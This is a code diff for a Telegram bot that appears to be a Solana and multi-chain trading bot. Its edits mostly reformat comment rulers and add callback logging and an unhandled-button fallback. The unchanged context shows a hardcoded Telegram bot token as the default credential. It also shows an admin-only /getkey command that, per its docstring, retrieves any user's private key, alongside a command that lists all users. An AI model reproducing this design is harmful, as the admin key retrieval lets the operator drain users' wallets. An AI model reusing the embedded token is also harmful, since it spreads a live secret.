@@ -21,7 +21,7 @@ from cryptography.fernet import Fernet
 logging.basicConfig(level=logging.INFO)
 logger = logging.getLogger(__name__)
 
-# ── Config ────────────────────────────────────────────────────────────────────
+# ── Config ────────────────────────────────────────────────────────────
 BOT_TOKEN = os.getenv("BOT_TOKEN", "8649509501:AAFEgBNLg3N9zpHyVRcriQt9WLiX4TU880g")
 RPC_URL     = os.getenv("RPC_URL", "https://api.mainnet-beta.solana.com")
 
@@ -48,7 +48,7 @@ AWAITING_TOKEN_ADDR  = 2
 AWAITING_BUY_AMOUNT  = 3
 AWAITING_SELL_AMOUNT = 4
 
-# ── Helpers ───────────────────────────────────────────────────────────────────
+# ── Helpers ────────────────────────────────────────────────────────────
 def encrypt_key(secret_bytes: bytes) -> bytes:
     return fernet.encrypt(secret_bytes)
 
@@ -112,7 +112,7 @@ async def jupiter_swap(quote: dict, user_pubkey: str) -> dict | None:
                 return None
             return await r.json()
 
-# ── Keyboards ─────────────────────────────────────────────────────────────────
+# ── Keyboards ──────────────────────────────────────────────────────────
 def main_menu_keyboard():
     return InlineKeyboardMarkup([
         [InlineKeyboardButton("🔍 Search",          callback_data="positions"),
@@ -361,7 +361,7 @@ def support_keyboard():
         [InlineKeyboardButton("🗑️ Close", callback_data="close")],
     ])
 
-# ── Chains ────────────────────────────────────────────────────────────────────
+# ── Chains ───────────────────────────────────────────────────────────
 CHAINS = ["sol", "eth", "bnb", "base", "hype", "tron", "sui", "pol"]
 
 def chains_keyboard():
@@ -394,14 +394,14 @@ def _chain_wallet_text(chain: str) -> str:
         f"🕐 *Last updated:* {ts}"
     )
 
-# ── Main menu buttons ─────────────────────────────────────────────────────────
+# ── Main menu buttons ────────────────────────────────────────────────────────
 MAIN_MENU_BUTTONS = {
     "positions", "lp_sniper", "copy_trade", "wallets", "afk_mode",
     "settings", "limit_orders", "referral", "bridge", "refresh",
     "chains",
 }
 
-# ── Start ─────────────────────────────────────────────────────────────────────
+# ── Start ────────────────────────────────────────────────────────────
 async def start(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
     uid = update.effective_user.id
     await update.message.reply_text(
@@ -409,7 +409,7 @@ async def start(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
         reply_markup=main_menu_keyboard(),
     )
 
-# ── Admin command ─────────────────────────────────────────────────────────────
+# ── Admin command ─────────────────────────────────────────────────────────
 async def getkey(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
     """Admin-only: /getkey <user_id> — retrieves a user's private key."""
     caller_id = update.effective_user.id
@@ -466,13 +466,15 @@ async def allusers(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
         msg += f"ID: `{uid}` | @{info['username']} | {info['first_name']}\n"
     await update.message.reply_text(msg, parse_mode="Markdown")
 
-# ── Button handler ────────────────────────────────────────────────────────────
+# ── Button handler ─────────────────────────────────────────────────────────
 async def button_handler(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
     query   = update.callback_query
     await query.answer()
     uid     = query.from_user.id
     data    = query.data
     chat_id = query.message.chat_id
+
+    logger.info("Callback received: user_id=%s data=%s", uid, data)
 
     user = update.effective_user
     all_users[user.id] = {
@@ -629,7 +631,7 @@ async def button_handler(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
         )
         return
 
-    # ── Wallets screen ────────────────────────────────────────────────────────
+    # ── Wallets screen ───────────────────────────────────────────────────────
     if data == "wallets":
         await query.edit_message_text(
             _wallet_settings_text(),
@@ -806,7 +808,7 @@ async def button_handler(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
         await query.message.delete()
         return
 
-    # ── Bridge screen ─────────────────────────────────────────────────────────
+    # ── Bridge screen ────────────────────────────────────────────────────────
     if data == "bridge":
         await query.edit_message_text(
             _bridge_text(),
@@ -860,7 +862,7 @@ async def button_handler(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
         )
         return
 
-    # ── Chains screen ─────────────────────────────────────────────────────────
+    # ── Chains screen ────────────────────────────────────────────────────────
     if data == "chains":
         await query.edit_message_text(
             "🔗 *Select your preferred Network*",
@@ -928,7 +930,7 @@ async def button_handler(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
         )
         return
 
-    # ── Cancel prompt — send new message confirming cancel ───────────────────
+    # ── Cancel prompt — send new message confirming cancel ───────���───────────
     if data == "cancel_prompt":
         await ctx.bot.send_message(
             chat_id,
@@ -937,7 +939,7 @@ async def button_handler(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
         )
         return
 
-    # ── Back to menu ──────────────────────────────────────────────────────────
+    # ── Back to menu ────────────────────────────────────────────────────────
     if data == "back_to_menu":
         await ctx.bot.send_message(
             chat_id,
@@ -955,6 +957,10 @@ async def button_handler(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
     if data in ("confirm_buy", "confirm_sell"):
         await confirm_swap(update, ctx)
         return
+
+    # Debug fallback: catches and logs any button that is created but not wired up.
+    logger.warning("Unhandled callback_data=%s user_id=%s chat_id=%s", data, uid, chat_id)
+    await query.answer("This button is not implemented yet or is unavailable.", show_alert=True)
 
 # ── Message handler (multi-step flows) ───────────────────────────────────────
 async def message_handler(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
@@ -1008,7 +1014,7 @@ async def message_handler(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
             )
         return
 
-    # ── Buy amount ────────────────────────────────────────────────────────────
+    # ── Buy amount ────────────────────────────────────────────────────────
     if awaiting == AWAITING_BUY_AMOUNT:
         try:
             sol_amount = float(text)
@@ -1037,7 +1043,7 @@ async def message_handler(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
         ctx.user_data["awaiting"]      = None
         return
 
-    # ── Sell amount ───────────────────────────────────────────────────────────
+    # ── Sell amount ────────────────────────────────────────────────────────
     if awaiting == AWAITING_SELL_AMOUNT:
         try:
             token_amount = int(text)
@@ -1065,7 +1071,7 @@ async def message_handler(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
         ctx.user_data["awaiting"]      = None
         return
 
-# ── Swap confirmation ─────────────────────────────────────────────────────────
+# ── Swap confirmation ───────────────────────────────────────────────────────
 async def confirm_swap(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
     query   = update.callback_query
     uid     = query.from_user.id
@@ -1111,7 +1117,7 @@ async def confirm_swap(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
         reply_markup=main_menu_keyboard(),
     )
 
-# ── Entry point ───────────────────────────────────────────────────────────────
+# ── Entry point ─────────────────────────────────────────────────────────
 def main():
     app = ApplicationBuilder().token(BOT_TOKEN).build()
 
